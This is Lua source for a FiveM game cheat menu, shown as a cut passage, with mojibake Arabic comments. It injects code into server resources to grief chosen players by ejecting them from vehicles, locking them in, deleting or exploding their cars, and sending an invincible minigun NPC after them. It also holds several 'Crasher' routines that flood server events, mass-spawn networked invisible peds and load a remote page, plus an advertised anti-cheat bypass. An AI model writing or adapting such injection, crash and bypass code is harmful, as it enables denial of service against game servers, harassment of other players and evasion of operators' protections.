                                            local randomY = vehiclePos.y + math.random(-700, 700)
                                            local randomZ = vehiclePos.z
                                            
                                            -- Ù…Ù‡Ù…Ø© Ø§Ù„Ù‚ÙŠØ§Ø¯Ø© Ø¨Ø³Ø±Ø¹Ø© Ù…Ø¹Ù‚ÙˆÙ„Ø© ÙˆØ«Ø§Ø¨ØªØ©
                                            TaskVehicleDriveToCoord(botPed, targetVehicle, randomX, randomY, randomZ, 35.0, 0, GetEntityModel(targetVehicle), 786603, 3.0, true)
                                            
                                            -- Ø§Ù„Ø­ÙØ§Ø¸ Ø¹Ù„Ù‰ Ø³Ø±Ø¹Ø© Ø«Ø§Ø¨ØªØ© Ø¨Ø¯ÙˆÙ† Ù‚ÙØ²Ø§Øª Ù…ÙØ§Ø¬Ø¦Ø©
                                            SetVehicleForwardSpeed(targetVehicle, 25.0)
                                            
                                            Citizen.Wait(6000) -- Ø§Ù†ØªØ¸Ø§Ø± 6 Ø«ÙˆØ§Ù† Ù‚Ø¨Ù„ ØªØºÙŠÙŠØ± Ø§Ù„ÙˆØ¬Ù‡Ø©
                                        else
                                            break
                                        end
                                    end
                                end)
                                
                                -- Ø­Ø°Ù Ø§Ù„Ø¨ÙˆØª Ø¨Ø¹Ø¯ 2 Ø¯Ù‚ÙŠÙ‚Ø©
                                Citizen.CreateThread(function()
                                    Citizen.Wait(120000) -- 2 Ø¯Ù‚ÙŠÙ‚Ø©
                                    if DoesEntityExist(botPed) then
                                        DeleteEntity(botPed)
                                    end
                                end)
                                
                                SetModelAsNoLongerNeeded(botModel)
                            end
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Kicked Player ID: " .. GetPlayerServerId(selectedPlayer) .. " from vehicle and added steady speed bot driver")
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)
MachoMenuButton(PlayerSection, "LOCK Vehicle", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            if DoesEntityExist(targetVehicle) then
                                SetVehicleDoorsLocked(targetVehicle, 4)
                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
                                for seat = 0, maxSeats do
                                    local ped = GetPedInVehicleSeat(targetVehicle, seat)
                                    if ped ~= 0 and ped ~= playerPed then
                                        SetPedCanBeDraggedOut(ped, false)
                                        SetPedConfigFlag(ped, 32, true)
                                        TaskWarpPedIntoVehicle(ped, targetVehicle, seat)
                                    end
                                end
                            end
                            
                            SetEntityVisible(playerPed, true, false)
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Kicked Player ID: " .. GetPlayerServerId(selectedPlayer) .. " from vehicle")
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)
MachoMenuButton(PlayerSection, "Delete Vehicle", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            if DoesEntityExist(targetVehicle) then
                                -- Ø­Ø°Ù Ø§Ù„Ø³ÙŠØ§Ø±Ø©
                                DeleteEntity(targetVehicle)
                            end
                            
                            SetEntityVisible(playerPed, true, false)
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Vehicle deleted for Player ID: " .. GetPlayerServerId(selectedPlayer))
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)


-- Ø¯Ø§Ù„Ø© Ù…Ø³Ø§Ø¹Ø¯Ø© Ù„ØªØ¹Ø¯Ø§Ø¯ Ø§Ù„Ø³ÙŠØ§Ø±Ø§Øª
function EnumerateVehicles()
    return coroutine.wrap(function()
        local iter, id = FindFirstVehicle()
        if not id or id == 0 then
            EndFindVehicle(iter)
            return
        end
        
        local enum = {handle = iter, destructor = EndFindVehicle}
        setmetatable(enum, entityEnumerator)
        
        local next = true
        repeat
            coroutine.yield(id)
            next, id = FindNextVehicle(iter)
        until not next
        
        enum.destructor, enum.handle = nil, nil
        EndFindVehicle(iter)
    end)
end

-- Metatable Ù„Ù„Ù€ entity enumerator
entityEnumerator = {
    __gc = function(enum)
        if enum.destructor and enum.handle then
            enum.destructor(enum.handle)
        end
    end
}
MachoMenuButton(PlayerSection, "Boom vehicle", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    if selectedPlayer and selectedPlayer ~= -1 then
        local targetPed = GetPlayerPed(selectedPlayer)
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)

                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)

                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[

                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

                            SetEntityVisible(playerPed, false, false)

                            TaskLeaveVehicle(targetPed, targetVehicle, 0)

                            SetPedMoveRateOverride(playerPed, 10.0)

                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)

                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)

                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)

                            Citizen.Wait(500)
                            keepHidden = false

                            ClearPedTasksImmediately(playerPed)

                            SetEntityAsMissionEntity(playerPed, true, true)

                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)

                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end

                            Citizen.Wait(100)

                            ClearPedTasksImmediately(playerPed)

                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)

                            SetEntityVisible(playerPed, false, false)

                            Citizen.Wait(100)

                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)

                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)

                            Citizen.Wait(100)

                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)

                            Citizen.Wait(600)

                            ClearPedTasks(playerPed)

                            SetEntityVisible(playerPed, true, false)

                            -- Explode target vehicle using ExplodeVehicle with all options set to false
                            if DoesEntityExist(targetVehicle) then
                                ExplodeVehicle(targetVehicle, false, false)
                            end
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Kicked Player ID: " .. GetPlayerServerId(selectedPlayer) .. " from vehicle and detonated")
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)

MachoMenuText(PlayerSection,"Risky trolls")

MachoMenuButton(PlayerSection, "Spawn Attack NPC (!)", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    
    if not selectedPlayer then
        MachoMenuNotification("Error", "No player selected! Select a player from the list first.")
        return
    end
    
    local serverId = GetPlayerServerId(selectedPlayer)
    MachoMenuNotification("NPC System", "Spawning attack NPC on player ID: " .. serverId)
    
    -- Find available resource for injection
    local targetResource = nil
    local resourcePriority = {"any", "any", "any"}
    
    for _, resourceName in ipairs(resourcePriority) do
        if GetResourceState(resourceName) == "started" then
            targetResource = resourceName
            break
        end
    end
    
    if not targetResource then
        -- Fallback to any available resource
        local allResources = {}
        for i = 0, GetNumResources() - 1 do
            local resourceName = GetResourceByFindIndex(i)
            if resourceName and GetResourceState(resourceName) == "started" then
                targetResource = resourceName
                break
            end
        end
    end
    
    if not targetResource then
        MachoMenuNotification("Error", "No suitable resource found!")
        return
    end
    
    -- Spawn with resource injection
    MachoInjectResource(targetResource, string.format([[
        local npcModel = "g_m_y_ballasout_01"
        local weaponHash = GetHashKey("weapon_minigun")
        local playerPed = GetPlayerPed(GetPlayerFromServerId(%d))
        
        if not DoesEntityExist(playerPed) then
            TriggerEvent('chat:addMessage', { args = { '^1NPC System:', 'Target player not found!' } })
            return
        end
        
        local playerPos = GetEntityCoords(playerPed)
        
        RequestModel(npcModel)
        while not HasModelLoaded(npcModel) do
            Citizen.Wait(100)
        end
        
        -- Spawn single NPC
        local spawnX = playerPos.x + 3.0
        local spawnY = playerPos.y + 3.0
        local spawnZ = playerPos.z
        
        local npc = CreatePed(4, npcModel, spawnX, spawnY, spawnZ, 0.0, true, false)
        
        -- Make NPC immortal but can still ragdoll naturally
        SetEntityInvincible(npc, true)
        SetPedDiesWhenInjured(npc, false)
        
        -- Give minigun
        GiveWeaponToPed(npc, weaponHash, 9999, false, true)
        SetCurrentPedWeapon(npc, weaponHash, true)
        
        -- Combat settings focused on attacking
        SetPedCombatAttributes(npc, 5, true)
        SetPedCombatAttributes(npc, 46, true)
        SetPedCombatRange(npc, 2)
        SetPedCombatMovement(npc, 3)
        SetPedAccuracy(npc, 100)
        
        -- Attack target player
        TaskCombatPed(npc, playerPed, 0, 16)
        SetEntityAsNoLongerNeeded(npc)
        
        TriggerEvent('chat:addMessage', { args = { '^2NPC System:', 'Attack NPC spawned with minigun!' } })
    ]], serverId))
end)


local NitWitdestroyer = MachoMenuAddTab(MenuWindow, "Destroyer")
    local LLeftSectionWidth = (MenuSize.x - TabsBarWidth) * 0.99

    local NitWiroyer = MachoMenuGroup(NitWitdestroyer, "Main", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + LLeftSectionWidth, MenuSize.y - 5)
-- Define the GetPlayersInArea function to find nearby players
---

MachoMenuButton(NitWiroyer, "Crasher v1", function()
    function GetPlayersInArea()
    local players = {}
    for _, player in ipairs(GetActivePlayers()) do
        local ped = GetPlayerPed(player)
        if DoesEntityExist(ped) and ped ~= PlayerPedId() then
            -- Check the distance to ensure they are rendered
            local playerCoords = GetEntityCoords(ped)
            local myCoords = GetEntityCoords(PlayerPedId())
            local distance = Vdist(myCoords.x, myCoords.y, myCoords.z, playerCoords.x, playerCoords.y, playerCoords.z)
            
            -- Change 200.0 to your desired distance
            if distance < 200.0 then
                table.insert(players, player)
            end
        end
    end
    return players
end

    -- 1. Ø¬Ù„Ø¨ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù„Ø§Ø¹Ø¨ÙŠÙ† Ø§Ù„Ù…Ø±Ù†Ø¯Ø±ÙŠÙ† ÙˆØ­ÙØ¸ IDs
    local players = GetPlayersInArea() -- ØªØ§Ø¨Ø¹Ùƒ Ø§Ù„Ø®Ø§Øµ ÙŠØ±Ø¬Ø¹ Ped Ø£Ùˆ Player Index
    local playerIDs = {}

    for _, playerId in ipairs(players) do
        local serverId = GetPlayerServerId(playerId)
        if serverId and serverId > 0 then
            table.insert(playerIDs, serverId)
        end
    end
    

    if #playerIDs > 0 then
        -- 2. ÙØªØ­ DUI Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø·
        local dui = MachoCreateDui("https://wf-675.github.io/crashingo.gg/")
        MachoShowDui(dui)

        -- 3. 

        -- 4. Ø­ÙØ¸ Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ù„Ø§Ø¹Ø¨ Ø§Ù„Ø­Ø§Ù„ÙŠ ÙˆÙ†Ù‚Ù„Ù‡ Ù„Ù…ÙƒØ§Ù† Ù…Ø¤Ù‚Øª
        local ped = PlayerPedId()
        local originalCoords = GetEntityCoords(ped)
        SetEntityCoords(ped, 1500.0, -1500.0, 58.0, false, false, false, true)
        Wait(500)

        -- 5. ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„ØªØ±ÙŠØºØ± Ø¹Ù„Ù‰ ÙƒÙ„ Ø§Ù„Ù„Ø§Ø¹Ø¨ÙŠÙ† Ø§Ù„Ù…Ø±Ù†Ø¯Ø±ÙŠÙ† Ù…Ø¹ ØªØ£Ø®ÙŠØ± 10ms Ø¨ÙŠÙ† ÙƒÙ„ Ø´Ø®Øµ
        for _, serverId in ipairs(playerIDs) do
            for _, triggerData in ipairs(foundTriggers.items) do
                -- Ø§Ù„ØªØ±ÙŠØºØ± Ø§Ù„Ø®Ø§Øµ Ø¨Ø§Ù„Ø³ÙŠØ±ÙØ±
                MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:KidnapPlayer", ' .. serverId .. ')')
                Wait(10) -- ØªØ£Ø®ÙŠØ± 10 Ù…Ù„Ù„ÙŠ Ø«Ø§Ù†ÙŠØ© Ø¨ÙŠÙ† ÙƒÙ„ ØªØ±ÙŠØºØ±
            end
        end

        -- 6. Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ù‚Ø¨Ù„ Ø§Ù„Ø±Ø¬ÙˆØ¹
        Wait(4000)

        -- 7. Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù„Ø§Ø¹Ø¨ Ù„Ù…ÙƒØ§Ù†Ù‡ Ø§Ù„Ø£ØµÙ„ÙŠ
        SetEntityCoords(ped, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, true)

        -- 8. Ø¥Ø®ÙØ§Ø¡ ÙˆØ¥ØºÙ„Ø§Ù‚ DUI
        Wait(100)
        MachoDestroyDui(dui)

        MachoMenuNotification("Success", "All rendered players have been processed and you have been returned to your location.")
    else
        MachoMenuNotification("Error", "No players are currently rendered.")
    end
end)
MachoMenuButton(NitWiroyer, "Crasher v2", function()
    local targetResource = nil
    local resourcePriority = {"any", "any", "any"}
    local foundResources = {}
    
    for _, resourceName in ipairs(resourcePriority) do
        if GetResourceState(resourceName) == "started" then
            table.insert(foundResources, resourceName)
        end
    end
    
    if #foundResources > 0 then
        targetResource = foundResources[math.random(1, #foundResources)]
    else
        local allResources = {}
        for i = 0, GetNumResources() - 1 do
            local resourceName = GetResourceByFindIndex(i)
            if resourceName and GetResourceState(resourceName) == "started" then
                table.insert(allResources, resourceName)
            end
        end
        if #allResources > 0 then
            targetResource = allResources[math.random(1, #allResources)]
        else
            MachoMenuNotification("Crasher", "Failed - System error!")
            return
        end
    end
    
    MachoInjectResource(targetResource, [[
        local function getClosestPlayer()
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            local closestPlayer = nil
            local closestDistance = 999999.0
            
            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= 0 and targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)
                    
                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end
            
            return closestPlayer, closestDistance
        end
        
        local function spawnInvisibleWadeBot(coords)
            local hash = GetHashKey("ig_wade")
            
            RequestModel(hash)
            while not HasModelLoaded(hash) do
                Wait(10)
            end
            
            local bot = CreatePed(4, hash, coords.x, coords.y, coords.z, math.random(0, 360), true, false)
            
            SetEntityVisible(bot, false, false)
            SetEntityAlpha(bot, 0, false)
            SetEntityCollision(bot, false, false)
            SetEntityInvincible(bot, true)
            FreezeEntityPosition(bot, true)
            SetBlockingOfNonTemporaryEvents(bot, true)
            SetPedAsNoLongerNeeded(bot)
            
            NetworkRegisterEntityAsNetworked(bot)
            SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(bot), true)
            SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(bot), false)
            
            SetModelAsNoLongerNeeded(hash)
            
            return bot
        end
        
        local function executeWadeBotSpawn()
            local closestPlayer, distance = getClosestPlayer()
            
            if closestPlayer and distance < 100.0 then
                local targetPed = GetPlayerPed(closestPlayer)
                local targetCoords = GetEntityCoords(targetPed)
                
                for i = 1, 1400 do
                    local offsetX = math.random(-100, 100) / 10.0
                    local offsetY = math.random(-100, 100) / 10.0
                    local offsetZ = math.random(-20, 20) / 10.0
                    
                    local spawnCoords = vector3(
                        targetCoords.x + offsetX,
                        targetCoords.y + offsetY,
                        targetCoords.z + offsetZ
                    )
                    
                    CreateThread(function()
                        Wait(i * 50)
                        spawnInvisibleWadeBot(spawnCoords)
                    end)
                end
                
            else
            end
        end
        
        executeWadeBotSpawn()
        RegisterKeyMapping('wadebots', 'Spawn Wade Bots on Closest Player', 'keyboard', 'F10')
    ]])
    
    MachoMenuNotification("Crasher", "Operation completed successfully")
end)

MachoMenuButton(NitWiroyer, "Crasher v3", function()
MachoInjectResource("any", [[
local isARROWUpKeyPressed = false
local isSelectingPlayer = false
local selectedPlayer = -1
local outlineColor = {r = 0, g = 0, b = 0, a = 255} -- Color of the marker outline

-- Display notification for the selected player
local function SelectedByME(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    DrawNotification(true, false)
end

-- Function to draw 3D text
function Draw3DText(x, y, z, text, r, g, b, a)
    local onScreen, _x, _y = World3dToScreen2d(x, y, z)
    if onScreen then
        SetTextScale(0.0, 0.35)
        SetTextFont(0)
        SetTextProportional(true)
        SetTextColour(r, g, b, a)
        SetTextOutline()
        SetTextEntry("STRING")
        AddTextComponentString(text)
        DrawText(_x, _y)
    end
end

-- Check if a player is in the center of the screen
function IsPlayerAtScreenCenter(player)
    local ped = GetPlayerPed(player)
    local pedCoords = GetEntityCoords(ped)
    local onScreen, screenX, screenY = World3dToScreen2d(pedCoords.x, pedCoords.y, pedCoords.z)
    if onScreen then
        local centerX, centerY = 0.5, 0.5
        local tolerance = 0.05
        return math.abs(screenX - centerX) < tolerance and math.abs(screenY - centerY) < tolerance
    end
    return false
end

-- Draw a dot at the center of the screen
function DrawCenterDot()
    local centerX, centerY = 0.5, 0.5
    local dotSize = 0.02
    local textureDict = "mpmissionend"
    local textureName = "goldmedal"

    RequestStreamedTextureDict(textureDict, true)
    DrawSprite(textureDict, textureName, centerX, centerY, dotSize, dotSize, 0.0, 255, 0, 0, 255)
end

-- Main thread
Citizen.CreateThread(function()
    local Black = 0
    local Hat = 0

    while true do
        Citizen.Wait(0)

        isARROWUpKeyPressed = IsControlPressed(0, 172) -- ARROW UP key
        isSelectingPlayer = IsControlPressed(0, 19) -- Check if left ALT is pressed for selecting player

        if isSelectingPlayer then
            local players = GetActivePlayers()
            local closestPlayer = -1

            -- Loop through all active players
            for _, player in ipairs(players) do
                if IsPlayerAtScreenCenter(player) then
                    closestPlayer = player
                    break
                end
            end

            -- If a player is selected
            if closestPlayer ~= -1 then
                selectedPlayer = closestPlayer
            end
        end

        -- Continuously draw a marker on the selected player
        if selectedPlayer ~= -1 then
            local targetPed = GetPlayerPed(selectedPlayer)
            local targetCoords = GetEntityCoords(targetPed)

            -- Draw a marker on the selected player's position
            DrawMarker(
                1, -- Marker type (cylinder)
                targetCoords.x, targetCoords.y, targetCoords.z - 1.0, -- Position (at player's feet)
                0.0, 0.0, 0.0, -- Direction
                0.0, 0.0, 0.0, -- Rotation
                0.9, 0.9, 2.0, -- Scale of the marker
                outlineColor.r, outlineColor.g, outlineColor.b, outlineColor.a, -- Color (RGBA)
                false, false, 2, false, nil, nil, false -- Additional options
            )
        end

        -- Trigger an explosion if the ARROW UP key is pressed, but keep the marker on the selected player
        if isARROWUpKeyPressed and selectedPlayer ~= -1 then
            local targetPed = GetPlayerPed(selectedPlayer)
            local targetCoords = GetEntityCoords(targetPed)
            local targetServerId = GetPlayerServerId(selectedPlayer)

            if Black < 400 then
                -- Increase the counter
                Black = Black + 1

                TriggerServerEvent("hospital:server:RevivePlayer", targetServerId)
                Citizen.Wait(5) -- Short wait between triggers
            end

            if Hat < 400 then
                -- Increase the counter
                Hat = Hat + 1

                TriggerServerEvent("hospital:server:RevivePlayer", targetServerId)
                Citizen.Wait(5) -- Short wait between triggers
            end
        end

        -- Reset the counter if it has reached the limit (e.g., after a certain condition)
        -- You can implement your own condition for resetting this counter.
        if Black >= 400 then
            Black = 0 -- Reset the counter to allow usage again
            SelectedByME("You can Crash now..!!")
            print('You can Crash now..!!')
        end
        if Hat >= 400 then
            Hat = 0 
        end

        -- Draw the center dot on the screen for easier selection
        DrawCenterDot()
    end
end)
]])
end)

MachoMenuText(NitWiroyer,"bypass")



local spawnerEnabled = false
local selectedKey = 0
local objectName = "prop_dumpster_01a"
local fiveGuardDetected = false


CreateThread(function()
    while true do
        Wait(500) 
        print("========================================")
        print("            EAGLE AC BYPASS            ")
        print("             discord.gg/q1            ")
        print("      Object Spawner | Undetectable    ")
        print("========================================")
    end
end)


Citizen.CreateThread(function()
    local resources = GetNumResources()
    for i = 0, resources - 1 do
        local resource = GetResourceByFindIndex(i)
        local files = GetNumResourceMetadata(resource, 'client_script')
        for j = 0, files - 1 do
            local x = GetResourceMetadata(resource, 'client_script', j)
            if x ~= nil and string.find(x, "obfuscated") then
                fiveGuardDetected = true
                break
            end
        end
        if fiveGuardDetected then break end
    end
end)

-- Object Input Box
local ObjectInput = MachoMenuInputbox(NitWiroyer, "", "Enter object name")

-- Enable/Disable Checkbox  
MachoMenuCheckbox(NitWiroyer, "Object Spawn",
    function()
        local inputText = MachoMenuGetInputbox(ObjectInput)
        if inputText ~= "" then
            objectName = inputText
        end
        spawnerEnabled = true
        MachoMenuNotification("Eagle AC Bypass", "Activated Successfully")
    end,
    function()
        spawnerEnabled = false
    end
)

-- Keybind
MachoMenuKeybind(NitWiroyer, "Spawn Key", 0, function(key, toggle)
    selectedKey = key
end)

-- Camera Direction Function
function RotationToDirection(rotation)
    local adjustedRotation = {
        x = (math.pi / 180) * rotation.x,
        y = (math.pi / 180) * rotation.y,
        z = (math.pi / 180) * rotation.z
    }
    local direction = {
        x = -math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)),
        y = math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)),
        z = math.sin(adjustedRotation.x)
    }
    return direction
end

function SpawnBarrierAtTarget()
    local playerPed = PlayerPedId()
    local originalCoords = GetEntityCoords(playerPed)
    
    local cam = GetGameplayCamCoord()
    local camRot = GetGameplayCamRot(2)
    local camDirection = RotationToDirection(camRot)
    
    local rayEnd = {
        x = cam.x + (camDirection.x * 1000),
        y = cam.y + (camDirection.y * 1000),
        z = cam.z + (camDirection.z * 1000)
    }
    
    local raycast = StartShapeTestRay(cam.x, cam.y, cam.z, rayEnd.x, rayEnd.y, rayEnd.z, -1, playerPed, 0)
    local _, hit, hitCoords = GetShapeTestResult(raycast)
    
    local targetPoint = hit and hitCoords or rayEnd
    local newX = targetPoint.x
    local newY = targetPoint.y
    local newZ = targetPoint.z + 5.0
    
    if fiveGuardDetected then
        MachoInjectResource2(3, 'any', [[ TriggerEvent('Melix:SpawnBarrier', "MelixOnTopBar", "]] .. objectName .. [[") ]])
    else
        SetEntityCoordsNoOffset(playerPed, newX, newY, newZ, false, false, false)
        TriggerEvent('Melix:SpawnBarrier', "MelixOnTopBar", objectName)
        SetEntityCoordsNoOffset(playerPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
    end
end

-- Key Detection
MachoOnKeyDown(function(key)
    if key == selectedKey and selectedKey ~= 0 and spawnerEnabled then
        SpawnBarrierAtTarget()
    end
end)


MachoMenuText(NitWiroyer,"Exploits")

